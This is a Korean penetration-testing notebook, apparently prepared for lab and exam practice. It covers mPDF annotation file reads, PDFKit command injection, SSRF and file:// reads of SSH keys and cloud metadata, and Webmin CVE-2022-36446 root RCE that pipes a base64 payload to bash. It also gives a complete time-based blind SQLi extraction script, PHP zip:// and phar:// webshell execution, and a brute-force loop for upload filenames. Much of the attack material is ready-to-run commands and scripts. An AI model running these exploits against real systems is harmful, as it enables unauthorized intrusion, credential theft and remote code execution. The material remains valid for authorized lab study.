[[Hawat]] — `admin:admin` 기본 자격증명으로 열렸고, 그 안의 `issuetracker.zip`(164010B, md5 `cd816a09d8608c3b24b4e8c5c212640c`)이 애플리케이션 전체 소스였음. **공유 스토리지에 놓인 아카이브가 곧 진입점임**(B-1-21).

⚠️ **워드리스트 디렉터리 열거로는 `/cloud` 가 안 잡혔음**(`~/PG/Hawat/gob_50080.txt` — `/4`·`/images`·`/index.html` 과 `.ht*` 403 뿐). 버전 확인은 `status.php` 로: `{"version":"20.0.7.1","productname":"Nextcloud"}`.

#### B-1-23. 문서 변환기(HTML→PDF)는 서버측 파서다 — mPDF `<annotation>` 임의 파일 읽기

**탐지 신호** — 입력창에 HTML/마크다운을 넣으면 PDF·이미지·docx 가 돌아오는 화면. 「Convert HTML to PDF」 류.

**먼저 볼 것은 그 파서의 확장 태그임.** 표준 HTML 만 처리한다고 가정하지 말 것.

| 엔진 | 노려볼 것 |
|---|---|
| mPDF | `<annotation file="">`(파일을 PDF 첨부로 삽입) · `<barcode>` · `<qr>` |
| wkhtmltopdf · headless Chrome | `<iframe src="file://…">` · `<img src="file://…">` · SSRF |
| LaTeX 계열 | `\input{}` · `\write18` |

**버전 판정 독립 근거 2개**(응답 헤더 + 산출물 메타데이터) — [[Outdated]] 실측:
```text
Content-disposition: inline; filename="mpdf.pdf"
```
```bash
python3 -c "d=open('out1.pdf','rb').read(); i=d.find(b'/Producer'); \
  print(d[i+11:d.find(b')',i+11)].decode('utf-16-be'))"
```
⚠️ **mPDF 는 `/Producer` 를 UTF-16BE 로 씀 — `strings` 로는 안 보임.** 바이트를 직접 디코드할 것. 세 번째 근거로 `/vendor/composer/installed.json` 도 있음.

**mPDF `<annotation>` 수동 재현**(자동 도구 없음):
```bash
#!/bin/bash
# usage: ./lfi.sh /etc/passwd
F="$1"
curl -s -m 30 -X POST --data-urlencode "html=<annotation file=\"$F\" content=\"$F\" icon=\"Graph\" title=\"a\" pos-x=\"195\" />" http://<타겟>/index.php -o /tmp/lfi.pdf
python3 extract_attach.py /tmp/lfi.pdf
```
— 출처: `~/PG/Outdated/lfi.sh`

- `--data-urlencode` 를 기본으로 둘 것 — 페이로드에 `&`·`+`·`%` 가 섞이면 `-d` 는 거기서 파라미터를 자르거나 값을 바꿈. ⚠️ **`<`·`>`·`"`·`/`·공백은 폼 인코딩에서 특수문자가 «아니고», 이 페이로드는 `-d` 로도 같은 값이 도달함**(2026-08-26 Kali 로컬 PHP 로 양쪽 대조). 「이 문자들 때문에 `-d` 로는 깨진다」는 서술은 반증됨
- `content` **필수** — mPDF `v6.0.0` `mpdf.php` 의 `case 'ANNOTATION'` 이 `isset($attr['CONTENT'])` 아니면 즉시 `break` → 태그가 통째로 버려지고 첨부도 안 생김. `icon`·`title`·`pos-x` 는 선택이고 기본값이 각각 `Note`·빈 문자열·`0`. 하나씩 빼는 실험은 박스에서 하지 않았음(관측 없음)
- `php://filter/convert.base64-encode/resource=<경로>` 래퍼도 통함
- 결과는 화면이 아니라 **PDF EmbeddedFile 스트림**(`/FlateDecode`)에 들어감 — 꺼내는 절차는 A-2-15

**노림수** — 웹루트의 설정 파일. [[Outdated]] 는 `/config/config.php` 의 **주석 처리된 mysqli 블록**에 있던 비번이 OS 계정 SSH 비번과 같았음. **주석은 은닉이 아님** — 브라우저로 열면 빈 화면이라 LFI 로만 보임.

**출처** — [[Outdated]].

**wkhtmltopdf 래퍼는 «명령행» 쪽도 봐야 함 — PDFKit CVE-2022-25765(Ruby).**
`<annotation>`·`<iframe file://>` 같은 **파서 확장**만이 공격면이 아님. 래퍼가 렌더러를 **문자열 명령으로** 호출하면 URL 파라미터 자체가 명령주입 지점이 됨.
- **탐지 신호** — `WEBrick`·`Puma` + 「HTML to PDF」 폼. 백트레이스나 `Gemfile.lock` 에 `pdfkit`
- **취약 범위** — `< 0.8.7.2`. `0.8.7` 은 판정 로직만 고친 중간 상태라 범위에 포함됨
- **페이로드** — `url=http://x/?a=%20` + 백틱 명령. `$( )` 도 가능
- **급소는 `%20`** — `url_needs_escaping?` 가 `unescape(@source) == @source` 라, 입력에 `%XX` 가 하나라도 있어야 이스케이프가 «건너뛰어짐». 빠지면 백틱이 `%60` 이 되어 조용히 실패(A-2-30)
- **`;`·`|` 는 안 통함** — URL 이 `%{"#{shell_safe_url}"}` 로 쌍따옴표에 감싸져 있음. **필터가 아니라 «인용» 때문임** — 원인을 잘못 짚으면 「WAF 우회」라는 없는 문제를 풀며 시간을 태움. 셸 쌍따옴표는 `` ` ``·`$( )`·`$VAR` 를 막지 못함

**HTML→PDF 기능을 보면 네 가지를 순서대로 시도할 것.** 명령주입이 막혀 있어도 나머지 셋이 남음:

| 공격 | 성립 이유 |
|---|---|
| 명령주입 | URL·파일명이 셸 명령 문자열에 들어감 |
| SSRF | 렌더러가 서버 측에서 임의 URL 을 가져옴(`http://127.0.0.1:…`, 메타데이터 `169.254.169.254`) |
| 로컬 파일 읽기 | `file:///etc/passwd` 를 렌더시켜 PDF 로 받음 |
| XSS→LFR | HTML 본문을 받으면 `<iframe src=file:///…>` · `<script>fetch('file://…')` |

```text
url=file:///etc/passwd
url=file:///home/<유저>/app/app.rb
url=file:///root/.ssh/id_rsa
url=http://127.0.0.1:22/
url=http://169.254.169.254/latest/meta-data/
<iframe src="file:///etc/passwd" width=1000 height=1000>
```
**결과가 PDF 로 돌아오는 서비스는 출력 채널이 이미 확보된 것**이라 blind 로 싸울 필요가 없음 — [[Hawat]] 의 blind SQLi(출력 채널 없음)와 정반대 상황임. **출력 채널의 유무가 공략 난이도를 한 자릿수 바꿈.**

**렌더러 버전은 정상 기능으로도 얻어짐(주입 불필요).**
```bash
curl -s -X POST http://TARGET:3000/pdf --data-urlencode 'url=http://example.com/' -o out.pdf
exiftool out.pdf | grep -iE 'creator|producer|pdf version'
```
`Creator:` 에 wkhtmltopdf 가 보이면 셸 호출·SSRF·`file://` 이 후보로 올라오고, `Producer:` 의 Qt 4.x 는 wkhtmltopdf 가 쓰는 구형 QtWebKit 이라 JS 실행과 SSRF·XXE 계열이 함께 열림.
⚠️ **[[RubyDome]] 에서는 이 절차를 수행하지 않았음** — `~/PG/RubyDome/` 에 PDF 가 한 개도 없고 `exiftool`·`pdfinfo` 실행 기록도 없음. **기법은 유효하나 버전 숫자를 적으려면 실제로 읽어야 함.**

**버전을 몰라도 기능에서 라이브러리를 역추론할 수 있음** — 「Ruby + HTML→PDF」면 사실상 PDFKit 아니면 WickedPDF 이고 둘 다 wkhtmltopdf 래퍼에 명령주입 이력이 있음 → **버전 확정 전에 페이로드를 던져보는 편이 빠를 때가 있음**(A-13).

#### B-1-24. Webmin package-updates 인증 후 RCE — CVE-2022-36446

**탐지 신호** — tcp/10000 (또는 20000 = Usermin). `MiniServ` 배너, 자체서명 인증서, **https 필수**(평문 http 로 붙으면 정상 응답이 안 옴). 버전은 `/usr/share/webmin/version` 또는 모듈 페이지 `<title>` 에 그대로 박혀 있음.

**핵심 — 인증이 unix/PAM 이라 OS 계정 자격증명이 그대로 통함.** 별도 Webmin 계정을 찾을 필요가 없음. 그리고 MiniServ 가 root 로 돌므로 주입 명령도 root 로 실행됨.

```bash
# ① 로그인 — 쿠키 항아리에 sid 가 떨어지면 성공
curl -sk -c cj.txt -H 'Cookie: testing=1' \
  https://127.0.0.1:10000/session_login.cgi \
  --data 'user=<계정>&pass=<퍼센트인코딩한 비번>'

# ② 모듈 접근권 확인 — 200 + 모듈 «본문»이 오면 ACL 있음
curl -sk -b cj.txt https://127.0.0.1:10000/package-updates/ -o pu.html

# ③ 주입
curl -sk -b "sid=<SID>" -e 'https://127.0.0.1:10000/package-updates/' \
  'https://127.0.0.1:10000/package-updates/update.cgi' \
  --data-urlencode "u=;echo <BASE64>|base64 -d|bash;" \
  --data-urlencode 'confirm=1' --data-urlencode 'mode=new'
```

**발화 조건 셋 — 하나라도 빠지면 조용히 아무 일도 안 남:**

| 조건 | 왜 |
|---|---|
| **`Referer` 헤더**(`-e`) | 없으면 Security Warning + 302. **이것이 나머지 둘을 전부 가림**(A-15) |
| **`mode=new`** | `&package_install($p,$s,$in{'mode'} eq 'new')` — 거짓이면 존재하지 않는 이름에서 `!$pkg` 로 return, 싱크에 도달 못 함 |
| **페이로드에 `/` 금지** | `($p,$s) = split(/\//,$ps)` 로 앞 조각만 씀. **명령 전체를 base64 로 감쌀 것**(B-81) |

`confirm=1` 은 **필수 여부 미확정** — 당시 기록은 「없으면 dry-run 만」이라 적었으나 소스상으로는 빈 결과 → 설치 분기로 떨어짐. 따로 떼어 검증한 적 없음 `[가정]`. 붙여 보낼 것.

**메커니즘** — `software/apt-lib.pl` 의 `update_system_install`:
```perl
$update = join(" ", map { quotemeta($_) } split(/\s+/, $update));
$update =~ s/\\(-)|\\(.)/$1$2/g;                                    # ← quotemeta 를 도로 벗긴다
local $cmd = "$apt_get_command -y ".($force ? " -f" : "")." install $update";
```
`quotemeta` 로 이스케이프한 직후 정규식이 백슬래시를 전부 벗김 → `;`·`|` 가 그대로 셸에 도달.

**⚠️ 접근권 판정 함정** — 응답 루트 태그의 `data-access-level="0"` 과 `data-package-updates="1"` 을 근거로 쓰지 말 것. **거부당한 응답(`exploit_resp.html`)에도 똑같이 붙어 있음**(2026-08-26 재확인). 판정 근거는 「모듈 본문이 왔는가」 하나임.

**시험 관점** — Metasploit 에 `webmin_package_updates_rce` 모듈이 있으나 **1대 한정 카드**라 수동이 이득(E 절). 포트가 밖에서 안 보이면 SSH `-L` 로 끌어올 것(B-71).

**출처** — [[Outdated]] (Webmin 1.996 / Ubuntu 20.04.5).

#### B-1-25. time-based blind SQLi 를 손으로 짠다 — sqlmap 금지 대비

**탐지 신호** — 주입은 되는데 UNION·에러·Boolean 채널이 전부 죽어 있음(A-2-17). 남는 것이 시간 채널임. **시간은 1비트 채널**(느리다/안 느리다)이고, 이 1비트를 반복해 임의의 데이터를 복원하는 것이 blind SQLi 의 전부임.

**스택 쿼리가 되는지부터 판정** — `;SELECT SLEEP(5)#` 한 방. 되면 `SELECT` 뿐 아니라 `INTO OUTFILE`·`INTO DUMPFILE`·`CREATE FUNCTION`(UDF)까지 열림. **드라이버가 전부를 결정함:**

| 스택 | 드라이버/함수 | 기본 동작 |
|---|---|---|
| PHP + mysqli — `mysqli_multi_query()` | 세미콜론 구분 다중문 실행 | ✅ 스택됨 |
| PHP + mysqli — `mysqli_query()` | 한 문장만 실행 | ❌ |
| PHP + PDO(mysql) | 에뮬레이션 프리페어가 켜지면 가능 | 상황별 |
| Java + JDBC (MySQL Connector/J) | `allowMultiQueries=false` 가 기본 | ❌ ([[Hawat]]) |

⚠️ 이 표는 **일반 지식**이고 [[Pebbles]] 에서 소스로 확인한 것이 아님 — 그 박스에서 확정된 것은 `;SELECT IF(…,SLEEP(0.6),0)#` 가 실제로 동작해 데이터를 뽑았다는 관측까지임(`[가정]`).

**페이로드 조각**
```text
1;SELECT IF((<조건>),SLEEP(0.6),0)#
```
| 조각 | 역할 |
|---|---|
| `1` | 원래 파라미터 값. 앞 문장을 문법적으로 온전하게 유지 |
| `;` | 문장 종료 — 여기서 스택 쿼리 시작 |
| `SELECT IF((조건),SLEEP(0.6),0)` | 참이면 0.6초 자고, 거짓이면 0 반환 |
| `#` | MySQL 주석. 뒤에 남는 잔여 쿼리 무력화 |

**스크립트 골격** — 엔드포인트·주입 위치만 바꾸면 어느 blind SQLi 에도 재사용됨. 출처: `~/PG/Pebbles/blind.py`
```python
#!/usr/bin/env python3
import sys, time, requests
T="http://192.168.248.52/zm/index.php?view=request&request=log&task=query"
S=requests.Session()
DELAY=0.6
def truth(cond):
    p="1;SELECT IF((%s),SLEEP(%s),0)#" % (cond, DELAY)
    t=time.time(); S.post(T, data={"limit":p}, timeout=30)
    return (time.time()-t) > 0.40
def int_val(expr, lo, hi):
    while lo<hi:
        mid=(lo+hi)//2
        if truth("(%s)>%d"%(expr,mid)): lo=mid+1
        else: hi=mid
    return lo
def extract(expr):
    L=int_val("LENGTH(%s)"%expr,0,4096)
    out=""
    for i in range(1,L+1):
        c=int_val("ASCII(SUBSTRING((%s),%d,1))"%(expr,i),0,127)
        out+=chr(c); sys.stdout.write(chr(c)); sys.stdout.flush()
    print(); return out
if __name__=="__main__":
    what=sys.argv[1]
    sys.stderr.write("[*] len... "); 
    v=extract(what)
    print("[+] RESULT: %r"%v)
```

**반드시 이진 탐색으로 짤 것.** 문자당 `log2(128)=7`회 · 길이 12회. 32자면 `12+32×7=236`회. `=` 로 하나씩 대보는 선형은 평균 64회/문자 = 2048회 — **9배 차이**가 「감당 가능/불가능」을 가름.

**길이를 먼저 구할 것.** `SUBSTRING` 은 범위를 넘으면 빈 문자를 돌려줌. 「ASCII 가 0 이면 종료」로 짜면 진짜 데이터에 제어문자가 섞였을 때 조기 종료 오류가 남.

**세션 재사용**(`requests.Session()`) — 수백~수천 요청이라 핸드셰이크 절감이 속도에 크게 기여함.

**엔드포인트는 «가장 단순하고 조용한 read-only» 를 고를 것.** 같은 취약점이 여러 파라미터에 있으면 부수효과 없는 곳을 씀 — 부수효과가 있는 경로(글쓰기·상태변경)는 DB 를 오염시키고 앱을 느리게 만듦. [[Pebbles]] 는 `view=events`(hidden 필드)·`view=filter`(복잡한 파라미터 동반) 대신 **`view=request&request=log&task=query`(받는 것이 `limit` 하나뿐)** 를 골랐음.

**`LOAD_FILE` 로 파일 읽기 — 세 조건이 다 맞아야 함.** ① DB 계정에 `FILE` 권한 ② 대상 파일이 mysqld 가 읽을 수 있는 권한 ③ `secure_file_priv` 가 비었거나 그 경로 허용. 하나라도 막히면 **에러가 아니라 NULL 을 조용히 반환** — 빈 값이라 「주입 실패」로 오독하기 쉬움.

**sqlmap 이 하는 일의 수동 대응**

| sqlmap | 수동 |
|---|---|
| 인젝션 탐지 | `;SELECT SLEEP(5)#` 응답 지연 확인 |
| DBMS 판별 | `SLEEP()`·`#` 주석·`information_schema` 가 통하면 MySQL |
| `--current-db` / 스키마 | `SELECT schema_name FROM information_schema.schemata` |
| `--tables` / `--columns` | `information_schema.tables` / `.columns` |
| `--dump` | `SUBSTRING`+`ASCII` 이진 탐색 |
| `--file-read` | `LOAD_FILE('/path')` |
| `--file-write` / `--os-shell` | `INTO DUMPFILE` (hex 리터럴) / UDF `sys_exec` |

⚠️ 임계값 튜닝과 「완주했는가」 판정은 A-67. **DB 채널로 읽은 플래그는 시험에서 0점임**(C-3 · E 절).

**출처** — [[Pebbles]] ZoneMinder 1.29.0 `limit` pre-auth SQLi. 32자 플래그 실측 추출 2분 33초.

**스택 쿼리 가부는 DBMS «×» 드라이버가 결정함 — 판단을 먼저 하면 안 되는 기법에 시간을 안 태움.** 순서는 에러 메시지로 DBMS 확정 → 아래 표로 가부 결정 → 되면 `UPDATE`·`EXEC`, 안 되면 UNION·blind.

| 조합 | 스택 쿼리 | 근거 |
|---|---|---|
| MSSQL + ADO.NET(`SqlCommand`) | **됨** | T-SQL 은 배치 실행이 기본([[Butch]]) |
| MSSQL + JDBC · PHP `sqlsrv` | 됨 | 동일 |
| PostgreSQL + 대부분의 드라이버 | 됨 | |
| MySQL + JDBC | **안 됨** | `allowMultiQueries=false` 가 기본([[Hawat]] 에서 실제로 막힘) |
| MySQL + PHP `mysqli_query()` | **안 됨** | 단일 문장만 실행 |
| MySQL + PHP `mysqli_multi_query()` | 됨 | 세미콜론 구분 다중문 |
| Oracle | **안 됨** | 익명 PL/SQL 블록 필요 |

**예외 타입이 DBMS 를 그대로 알려줌** — `System.Data.SqlClient.SqlException` = MSSQL / `MySql.Data.MySqlClient.MySqlException` = MySQL / `Oracle.ManagedDataAccess.Client.OracleException` = Oracle.
**주석 문법 차이** — T-SQL 은 `--` 만으로 줄 끝까지 주석. MySQL 은 `--` 뒤에 공백·개행 필수. `%23`(`#`)은 MySQL 전용. **URL 인코딩에서 후행 공백이 잘리는 사고가 흔하므로 어느 DBMS 든 `-- -` 또는 `/*` 습관이 안전함.**

#### B-1-26. 경로 트래버설은 「파일 경로 조립」의 문제다 — 방어 지점 3곳과 Go `filepath.Join` 함정

**성립 조건** — 사용자 입력이 파일시스템 경로의 일부가 되고, 그 경로가 의도한 디렉터리 밖으로 나가는 것을 막지 못함(CWE-22). **가장 자주 나오는 자리는 로직이 화려한 곳이 아니라 정적 파일을 서빙하는 핸들러**임 — 그 핸들러의 본질이 「URL 의 나머지 부분을 파일 경로로 쓰는 것」이기 때문.

| 방어 지점 | 방법 | 왜 자주 실패하는가 |
|---|---|---|
| 조립 **전** | 입력에서 `..`·`/`·널바이트 제거, 화이트리스트 | 인코딩 변형(`%2e%2e`·`..%2f`·`....//`)에 뚫림. **블랙리스트는 항상 짐** |
| 조립 **후** | 정규화한 절대경로가 기준 디렉터리로 시작하는지 검사 | 이 검사를 **아예 안 하면** 뚫림(CVE-2021-43798 이 이 경우) |
| OS 레벨 | chroot · 컨테이너 · 최소 권한 계정 | 개발자의 손을 떠나 있어 실제로는 없는 경우가 많음 |

**정답은 「조립 후 검사」임** — 정규화된 결과가 기준 디렉터리 하위인지 확인하는 것만이 인코딩 변형 «전부»를 한 번에 막음.

⚠️ **Go 의 `filepath.Join` 은 보안 경계가 아님.** 내부적으로 `filepath.Clean` 을 불러 `..` 를 **없애는 것이 아니라 해석해서 적용**함:
```text
filepath.Join("/var/lib/grafana/plugins/alertlist",
              "../../../../../../../../etc/passwd")
  →  "/etc/passwd"
```
결과가 문법적으로 완벽하게 정상인 절대경로라 `os.Open` 이 거부할 이유가 없음. **`Clean`/`Join` 은 경로를 예쁘게 만들 뿐 「밖으로 나갔는지」는 알려주지 않음** — 조립 결과를 기준 디렉터리와 직접 비교해야 함:
```go
if !strings.HasPrefix(filepath.Clean(pluginFilePath), plugin.PluginDir+string(os.PathSeparator)) {
    return 403
}
```
`[가정]` 함수·변수의 정확한 이름과 파일 위치는 8.3.0 소스를 직접 대조하지 않았음. **메커니즘(정규화는 되지만 경계 검사가 없다)은 확정이고 식별자 표기는 개념 재구성임.**

**성립 조건이 하나 더 있음 — 웹 프레임워크가 요청 경로를 미리 정규화하지 않아야 함:**

| 계층 | 정규화 | 결과 |
|---|---|---|
| 브라우저·`curl`(기본) | 함 | 서버에 `..` 가 **도달조차 안 함**(B-14) |
| Go `net/http.ServeMux` | 함(301 리다이렉트) | 트래버설 차단됨 |
| Grafana 라우터(macaron 계열) 와일드카드 | **안 함** | `..` 가 핸들러까지 원문 그대로 전달 |

즉 **「라우터가 원문을 넘긴다 + 핸들러가 경계를 검사하지 않는다」 두 조건의 곱**임. 어느 한쪽만 있으면 성립하지 않음.

**일반화 신호 — 어느 제품에서든 아래가 보이면 트래버설을 먼저 의심:**
- URL 에 자산 경로가 그대로 노출(`/static/…`·`/public/…`·`/assets/…`·`/theme/…`·`/download?file=…`)
- 경로 안에 **플러그인·테마·모듈 ID 같은 식별자 세그먼트**(그 뒤가 파일 경로일 가능성)
- 응답이 `Content-Type` 을 확장자로 추론(파일을 직접 열고 있다는 증거)

**출처** — [[Fanatastic]](CVE-2021-43798, Grafana 8.3.0 · 수정 8.3.1).

#### B-1-27. 임의 파일 읽기를 확보했다 — 무엇을 읽을 것인가

| 순위 | 대상 | 이유 |
|---|---|---|
| 1 | `/etc/passwd` | 트래버설 성립 증명 + 계정 목록. **항상 첫 타자** |
| 2 | 그 제품의 **설정 파일** | 비밀키·DB 경로·자격증명이 한곳에 모여 있음 |
| 3 | 그 제품의 **DB 파일** | SQLite 면 통째로 가져와 로컬에서 마음껏 질의 |
| 4 | 서비스 계정 `~/.ssh/id_rsa` | 있으면 즉시 셸 |
| 5 | `/proc/self/environ` · `/proc/self/cmdline` | 환경변수에 시크릿이 흔함 |
| 6 | `/etc/shadow` | 대개 권한 부족으로 실패 — **그 실패가 「프로세스가 root 가 아니다」라는 정보**임 |

⚠️ **플래그 파일도 후보에 넣을 것 — 단 «읽는 것»과 «점수»는 다름.** [[Twiggy]] 는 임의 파일 읽기를 얻은 시점에 `/root/proof.txt`·`/home/*/local.txt` 를 함께 후보로 뒀음. 값을 먼저 확보하면 셸이 죽어도 안전판이 남으므로 **정보 획득 기준으로는 4순위 근처가 맞음.** 다만 **그렇게 읽은 플래그는 시험에서 0점**이므로(E 절 · C-3) 값 확보는 안전판일 뿐이고 **대화형 셸에서 원위치 `cat` 을 따로 해야 함.**

**데비안·우분투 패키지 설치의 표준 위치 3종 세트** — 제품마다 외워두면 트래버설이 즉시 무기가 됨:
- 설정 `/etc/<제품>/…` · 데이터 `/var/lib/<제품>/…` · 로그 `/var/log/<제품>/`
- (Grafana 예: `/etc/grafana/grafana.ini` · `/var/lib/grafana/grafana.db` · `/var/log/grafana/`)

⚠️ **바이너리는 반드시 `-o` 로 저장하고 `file` 로 검증할 것**(B-82). `-o` 없이 받으면 SQLite 헤더의 널바이트가 터미널을 망가뜨리고, 파이프로 넘기면 인코딩 변환에 조용히 손상됨.

**출처** — [[Fanatastic]].

#### B-1-28. Go 서비스를 만나면 `/debug/pprof/` 부터

**Go 표준 라이브러리의 pprof 핸들러는 임포트만 해도 라우트가 등록됨.** 인증이 붙는 경우가 드묾.
- `/debug/pprof/cmdline` — **실행 인자와 설정 파일 경로**(= 트래버설로 무엇을 읽을지 결정하는 지도)
- `/debug/pprof/heap`·`goroutine` — 메모리 덤프. 운이 좋으면 토큰·비밀번호가 들어 있음

**「막힌 서비스」라도 경로 정보를 주면 다음 단계의 입력값이 됨.** [[Fanatastic]] 의 9090 Prometheus 2.32.1 은 완전 비인증이었으나 `web.enable-admin-api`·`web.enable-lifecycle` 이 둘 다 `false` 라 관리 API 경로가 막혀 있었음 — 그럼에도 `cmdline` 이 `/etc/prometheus/prometheus.yml` 같은 **후보 경로를 공짜로** 줬음.

#### B-1-29. 제품별 비인증 버전 엔드포인트 — 열거 시간을 5분에서 30초로

| 제품 | 비인증 버전 엔드포인트 |
|---|---|
| Grafana | `/api/health` |
| Prometheus | `/api/v1/status/buildinfo` |
| Nextcloud · ownCloud | `/status.php` |
| Elasticsearch | `/`(루트 JSON) |
| Jenkins | `X-Jenkins` 응답 헤더 |
| GitLab | `/help` 푸터 · `/api/v4/version`(인증 필요) |

**판정은 항상 독립 근거 2개**([[Hub]]·[[Levram]]·[[RubyDome]]·[[Astronaut]], A-11). [[Fanatastic]] 은 로그인 푸터 + `/api/health` + `/metrics` 의 `grafana_build_info` 커밋 해시 **3중 일치**로 확정했음.

**모니터링 스택은 `/metrics` 부터 볼 것.** Grafana `/metrics`(Prometheus 포맷)는 인증 없이 **계정 수(`grafana_stat_total_users`)와 설치 플러그인 ID(`grafana_plugin_build_info`)** 까지 줌 —
- 플러그인 ID 는 CVE-2021-43798 페이로드의 **필수 입력값**이라 추측 대신 정확한 값을 얻음(B-14 3번)
- `grafana_stat_total_users 1` 은 **「브루트포스 무의미」까지 알려줌.** 「안 해도 되는 일」을 알려주는 정보가 시험에서는 가장 비쌈

**SuiteCRM · SugarCRM** — `service/v4_1/rest.php` 의 `get_server_info` 가 **인증 없이** 버전을 뱉음.
```bash
curl -s "http://<타겟>/service/v4_1/rest.php?method=get_server_info&input_type=JSON&response_type=JSON&rest_data=%7B%7D"
```
```text
{"flavor":"CE","version":"6.5.25","suitecrm_version":"7.12.3","gmt_time":"2026-08-19 07:53:08"}
```
⚠️ **`version` 이 아니라 `suitecrm_version` 을 볼 것.** `version: 6.5.25` 는 SuiteCRM 이 포크한 SugarCRM CE 의 **기반 버전**이지 제품 버전이 아님. CVE 매칭은 `suitecrm_version` 쪽으로 함. `rest_data=%7B%7D` 는 `{}`(빈 JSON 객체)의 URL 인코딩.

**「파라미터 4개가 다 있어야 응답한다」는 흔한 오해임 — 소스가 반증함.** v7.12.3 태그의 `service/core/REST/SugarRestJSON.php`:
```php
$json_data = !empty($_REQUEST['rest_data'])? $GLOBALS['RAW_REQUEST']['rest_data']: '';
```
`rest_data` 가 없으면 fault 없이 **빈 문자열로 조용히 폴백**함. `input_type`·`response_type` 도 서비스 생성자에 기본값이 있음. **fault 를 내는 것은 `method` 하나뿐**으로 `if(empty($_REQUEST['method']) || !method_exists(...))` 분기에서만 에러가 남.
→ **일반화 — 파라미터가 안 먹을 때 「필수 파라미터가 빠졌나」부터 의심할 이유가 없음.** 어느 파라미터가 진짜 필수인지는 **엔트리포인트 소스 한 파일이면 확정됨.** 제품이 GitHub 에 있으면 **해당 태그**를 볼 것 — main 브랜치는 이미 달라져 있음.
⚠️ README 로 버전을 교차할 때도 「1행」으로 외우지 말 것 — v7.12.3 태그의 `README.md` 는 1~3행이 로고 링크이고 버전 헤딩은 그 아래에 옴. `head -10` 으로 볼 것.

**출처** — [[Crane]].

#### B-1-30. PHP 스트림 래퍼로 LFI 를 RCE 로 확장

**탐지** — `?file=`·`?page=`·`?include=`·`?path=` 파라미터를 보면 **`php://filter` 가 첫 수**임.

| 래퍼 | 하는 일 | LFI 에서의 용도 | `allow_url_include` 영향 |
|---|---|---|---|
| `php://filter/…` | 스트림을 읽으며 필터 통과(인코딩·변환) | **소스 코드 유출** | 안 받음(로컬 래퍼) |
| `zip://<아카이브>#<내부경로>` | zip 내부 파일을 스트림으로 | **아카이브 안 웹셸 실행** | 안 받음 |
| `phar://<파일>/<내부경로>` (**PHP < 8.0**) | phar 내부 접근 + 메타데이터 **자동 역직렬화** | 업로드 가능하면 역직렬화 RCE, **확장자 무관**(`.jpg` 도 됨) | 안 받음. PHP 8.0 부터 스트림 경유 자동 역직렬화 제거 |
| `data://text/plain;base64,…` | URL 에 데이터 직접 포함 | 페이로드를 파일 없이 include | **받음**(Off 면 실패) |
| `php://input` | 요청 본문을 스트림으로 | POST 본문에 `<?php ?>` 넣어 RCE | **받음** |
| `expect://` | 명령 직접 실행 | 즉시 RCE. 기본 미설치(PECL 확장 필요) | 미확인 |
| `compress.zlib://`·`compress.bzip2://` | 압축 투명 해제 | gz/bz2 안 파일 읽기 | 안 받음 |

⚠️ **`allow_url_include=Off` 는 `zip://`·`phar://`·`php://filter` 를 못 막음** — 「RFI 는 막았다」는 방어자 가정의 빈틈이 정확히 여기임.

**`php://filter/convert.base64-encode/resource=X`** — base64 인코딩이 실행 트리거(`<?php`)를 파괴해 소스가 텍스트로 그대로 출력됨. `string.rot13` 대체 필터는 **`short_open_tag=Off`(PHP 기본값)일 때만** 같은 효과 — rot13(`<?php`)=`<?cuc` 라 **여는 태그 `<?` 자체는 안 지워지기 때문**.

**`zip://<아카이브 경로>#<내부 엔트리>`** — 조건 4개: ①내용을 통제하는 파일이 디스크에 있어야(업로드·로그포이즈닝·세션파일) ②경로를 알아야 ③zip 형식 + 내부 엔트리 이름을 알아야 ④PHP zip 확장 활성. **「업로드가 zip 을 만든다」는 사실 자체가 익스플로잇 조건**임. 업로드가 zip 을 안 만들어도 **로컬에서 zip 을 만들어 `.jpg` 로 위장해 올리면 됨** — 래퍼는 매직바이트만 보므로 확장자 화이트리스트로 못 막음.

**막힐 때 순서대로** `[가정]`(이 부류에서 시간을 태우는 지점을 정리한 것 — [[Zipper]] 원 노트에 실패 기록이 없음):
- **`php://filter` 로 소스가 안 나옴** — ⓐ`resource=upload.php` 처럼 **확장자를 붙였음**(확장자 append 형 LFI 면 `upload.php.php` 를 찾다 실패 → **확장자를 빼고 재시도**) ⓑ응답이 base64 처럼 안 보임 → 눈으로 판단하지 말고 `| base64 -d` 로 파이프. HTML 에 섞여 나오면 raw 를 볼 것 ⓒ필터를 바꿈: `convert.base64-encode` → `convert.iconv.utf-8.utf-16` → `string.rot13`(위 전제)
- **`zip://` 가 무반응** — ⓐ**`#` 를 `%23` 으로 안 씀(압도적 1위, A-2-23)** ⓑ엔트리 이름에 `.php` 를 붙임(append 형이면 `.php.php`) ⓒzip 경로가 틀림 — 상대경로 기준은 `index.php` 가 있는 디렉터리. 헷갈리면 절대경로로 ⓓ**엔트리 이름을 모름** → 로컬에서 `unzip -l` 로 확인
- **업로드는 되는데 실행이 안 됨** — A-2-21

⚠️ **`/etc/passwd` 가 안 나온다고 「LFI 가 아니다」로 결론내지 말 것** — 확장자 append 형이면 확장자를 빼고 `.php` 파일을 노려야 함.

**출처** — [[Zipper]] — `index.php?file=php://filter/convert.base64-encode/resource=upload` 로 `upload.php` 소스 유출 → `zip://uploads/upload_<time>.zip%23shell` 로 웹셸 실행. **읽기는 `php://filter`, 실행은 `zip://`** 로 같은 파라미터에서 두 단계를 나눠 씀.
· [[PwnLab]] — `include($_GET['page'].".php")` 라 `resource=config`(확장자 없이)가 정답이었던 케이스. **확장자를 붙일지 말지는 그 코드가 결정함** — 위 「막힐 때 순서대로」 ⓐ와 같은 지점이고, 한 번 틀리면 **빈 결과**가 나와 원인 파악이 오래 걸림.

#### B-1-31. 업로드 파일명이 `time()` 기반이면 브루트로 뚫린다

**신호** — 업로드 성공 응답이나 다운로드 링크에 유닉스 시각(`time()`)·날짜(`date()`) 기반 파일명이 노출됨.

**공략** — 응답이 이름을 알려주면 그대로 읽는 것이 최선. 안 알려주면 업로드 시각 기준 **±5초 = 11개 후보**로 브루트:
```bash
for t in $(seq $(( $(date +%s) - 5 )) $(( $(date +%s) + 5 ))); do
  curl -s -o /dev/null -w "$t %{http_code}\n" "http://<타겟>/uploads/upload_$t.zip"
done
```
⚠️ 서버·Kali 시각이 어긋날 수 있으니 **응답의 `Date:` 헤더를 기준**으로 잡을 것(C-1 의 `clock-skew` 와 같은 함정).

**출처** — [[Zipper]] — `$zip_name = getcwd() . "/uploads/upload_" . time() . ".zip"`. **응답이 실제로 이름을 알려줘 브루트 자체가 불필요했음.** 방어 쪽 교훈은 「시각 기반 파일명은 항상 브루트 가능」임.

#### B-1-32. CMS 사용자명 «무료» 열거는 브루트포스 탐색공간을 두 자릿수로 줄인다

